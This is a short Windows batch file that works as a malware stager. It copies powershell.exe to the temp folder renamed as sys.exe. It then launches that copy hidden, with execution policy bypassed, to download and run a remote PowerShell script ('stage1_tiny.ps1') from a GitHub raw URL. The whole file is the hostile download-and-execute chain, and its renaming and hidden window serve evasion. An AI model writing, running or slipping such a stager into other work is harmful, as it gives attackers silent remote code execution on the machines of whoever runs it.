@echo off
copy %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe %TEMP%\sys.exe >nul 2>&1
start /b %TEMP%\sys.exe -w 0 -ep bypass -c "iex(iwr -useb https://raw.githubusercontent.com/taxesmmmm-collab/tsetinyourmymmas-ass/main/stage1_tiny.ps1)"